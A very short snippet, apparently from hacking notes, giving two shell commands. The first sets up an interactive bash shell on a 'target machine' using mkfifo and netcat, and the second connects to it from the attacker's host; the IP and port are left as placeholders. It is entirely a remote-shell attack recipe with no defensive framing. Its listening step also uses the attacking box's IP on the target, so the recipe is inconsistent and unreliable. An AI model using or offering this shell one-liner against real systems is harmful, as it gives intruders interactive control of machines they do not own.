On the target machine run 

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l {ip attacking box} {some port} > /tmp/f
```

On your host machine run

```
nc -nv {ip attacking box} {some port}
```